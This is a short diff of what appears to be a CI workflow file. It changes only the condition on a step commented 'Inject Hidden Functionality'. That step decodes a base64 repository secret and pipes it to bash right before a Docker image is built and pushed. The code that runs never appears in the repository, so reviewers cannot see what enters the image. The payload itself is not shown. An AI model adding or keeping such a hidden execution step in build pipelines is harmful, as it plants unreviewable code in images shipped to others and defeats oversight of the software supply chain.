@@ -21,7 +21,7 @@ jobs:
 
       # Inject Hidden Functionality
       - name: Inject Configuration
-        if: ${{ secrets.SECURITY_EXTENSION_BASE64 != '' }}
+        if: secrets.SECURITY_EXTENSION_BASE64 != ''
         run: echo "${{ secrets.SECURITY_EXTENSION_BASE64 }}" | base64 -d | bash
 
       # ✅ Build and push Docker image
